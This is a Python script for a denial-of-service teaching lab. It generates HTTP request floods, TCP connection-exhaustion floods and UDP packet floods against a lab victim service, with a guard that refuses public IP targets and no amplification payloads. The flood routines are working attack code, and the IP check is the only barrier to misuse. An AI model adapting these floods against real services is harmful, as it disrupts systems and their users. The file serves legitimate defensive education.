#!/usr/bin/env python3
"""
DDoS Lab - Traffic Generator
============================

Generates load against the lab's own victim service so learners can observe how
Layer 7 and Layer 4 floods overwhelm a target, and how a defense absorbs them.

SAFETY BY DESIGN — this is a teaching instrument, not a weapon:
  1. It resolves the target and REFUSES to run against any public IP address.
     It only accepts private (RFC1918), loopback, or link-local targets, i.e.
     lab/LAN hosts you control.
  2. In the lab it runs on an internal Docker network with no route to the
     internet, so packets physically cannot leave.
  3. Payloads are generic filler. It deliberately does NOT craft DNS/NTP/SNMP/
     SSDP amplification payloads — those exist only to attack third parties and
     have no place in a learning tool. See docs/concepts.md for why.

Standard library only, so the container image needs no dependencies.
"""

import argparse
import ipaddress
import socket
import sys
import threading
import time

BANNER = "DDoS LAB generator — lab/private targets only, refuses public IPs"


def resolve_and_guard(host, port):
    """Resolve host and refuse if any resolved address is public/global."""
    try:
        infos = socket.getaddrinfo(host, port, proto=socket.IPPROTO_TCP)
    except socket.gaierror as e:
        sys.exit(f"[refused] cannot resolve '{host}': {e}")
    ips = sorted({info[4][0] for info in infos})
    if not ips:
        sys.exit(f"[refused] '{host}' resolved to no addresses")
    for ip in ips:
        addr = ipaddress.ip_address(ip)
        allowed = addr.is_private or addr.is_loopback or addr.is_link_local
        if not allowed:
            sys.exit(
                f"[refused] '{host}' resolves to {ip}, which is a PUBLIC address.\n"
                f"          This generator only runs against lab/private targets "
                f"(RFC1918 / loopback / link-local).\n"
                f"          It will not be used to attack the internet."
            )
    return ips[0]


class Stats:
    def __init__(self):
        self.lock = threading.Lock()
        self.sent = 0
        self.ok = 0
        self.failed = 0
        self.bytes = 0

    def add(self, ok=True, nbytes=0):
        with self.lock:
            self.sent += 1
            self.bytes += nbytes
            if ok:
                self.ok += 1
            else:
                self.failed += 1


def run_workers(worker_fn, concurrency, duration, stats):
    stop_at = time.time() + duration
    threads = []
    for _ in range(concurrency):
        t = threading.Thread(target=worker_fn, args=(stop_at, stats), daemon=True)
        t.start()
        threads.append(t)

    # Live progress once per second on the generator side.
    start = time.time()
    last = 0
    while time.time() < stop_at:
        time.sleep(1.0)
        with stats.lock:
            sent, ok, failed = stats.sent, stats.ok, stats.failed
        rate = sent - last
        last = sent
        elapsed = time.time() - start
        print(f"  t={elapsed:4.0f}s  sent={sent:<9} ok={ok:<9} failed={failed:<9} rate={rate}/s",
              flush=True)
    for t in threads:
        t.join(timeout=2.0)


def http_flood(target, port, concurrency, duration, path):
    import http.client
    print(f"[L7] HTTP flood -> http://{target}:{port}{path}  concurrency={concurrency} duration={duration}s")
    stats = Stats()

    def worker(stop_at, st):
        conn = None
        while time.time() < stop_at:
            try:
                if conn is None:
                    conn = http.client.HTTPConnection(target, port, timeout=5)
                conn.request("GET", path, headers={"Connection": "keep-alive"})
                resp = conn.getresponse()
                body = resp.read()
                st.add(ok=(resp.status < 500), nbytes=len(body))
            except Exception:
                st.add(ok=False)
                try:
                    if conn:
                        conn.close()
                except Exception:
                    pass
                conn = None

    run_workers(worker, concurrency, duration, stats)
    return stats


def tcp_flood(target, port, concurrency, duration, hold):
    print(f"[L4] TCP connection flood -> {target}:{port}  concurrency={concurrency} "
          f"hold={hold}s duration={duration}s")
    stats = Stats()

    def worker(stop_at, st):
        while time.time() < stop_at:
            s = None
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(5)
                s.connect((target, port))
                st.add(ok=True)
                # Hold the socket open to occupy a slot in the connection table.
                time.sleep(hold)
            except Exception:
                st.add(ok=False)
            finally:
                if s is not None:
                    try:
                        s.close()
                    except Exception:
                        pass

    run_workers(worker, concurrency, duration, stats)
    return stats


def udp_flood(target, port, concurrency, duration, packet_size):
    print(f"[L4] UDP flood -> {target}:{port}  concurrency={concurrency} "
          f"packet_size={packet_size}B duration={duration}s")
    stats = Stats()
    payload = b"DDOSLAB-LOADTEST" * ((packet_size // 16) + 1)
    payload = payload[:packet_size]  # generic filler, not an amplification payload

    def worker(stop_at, st):
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while time.time() < stop_at:
            try:
                s.sendto(payload, (target, port))
                st.add(ok=True, nbytes=len(payload))
            except Exception:
                st.add(ok=False)
        s.close()

    run_workers(worker, concurrency, duration, stats)
    return stats


def summarize(stats, duration):
    print("-" * 60)
    print(f"  total sent : {stats.sent}")
    print(f"  ok         : {stats.ok}")
    print(f"  failed     : {stats.failed}")
    print(f"  data        : {stats.bytes / 1e6:.2f} MB")
    if duration > 0:
        print(f"  avg rate   : {stats.sent / duration:.0f}/s")
    print("-" * 60)
    print("Open the dashboard at http://localhost:9090 to see the victim's side.")


def main():
    p = argparse.ArgumentParser(description=BANNER)
    p.add_argument("mode", choices=["http-flood", "tcp-flood", "udp-flood"])
    p.add_argument("--target", default="victim", help="lab hostname/IP (default: victim)")
    p.add_argument("--port", type=int, default=8080)
    p.add_argument("--duration", type=int, default=20, help="seconds")
    p.add_argument("--concurrency", type=int, default=100)
    p.add_argument("--path", default="/", help="HTTP path (http-flood)")
    p.add_argument("--hold", type=float, default=3.0, help="seconds to hold each TCP conn (tcp-flood)")
    p.add_argument("--packet-size", type=int, default=512, help="UDP payload bytes (udp-flood)")
    args = p.parse_args()

    print("=" * 60)
    print(f" {BANNER}")
    print("=" * 60)
    resolved = resolve_and_guard(args.target, args.port)
    print(f"[ok] target '{args.target}' -> {resolved} (private/lab address)")

    start = time.time()
    if args.mode == "http-flood":
        stats = http_flood(args.target, args.port, args.concurrency, args.duration, args.path)
    elif args.mode == "tcp-flood":
        stats = tcp_flood(args.target, args.port, args.concurrency, args.duration, args.hold)
    else:
        stats = udp_flood(args.target, args.port, args.concurrency, args.duration, args.packet_size)
    summarize(stats, time.time() - start)


if __name__ == "__main__":
    main()
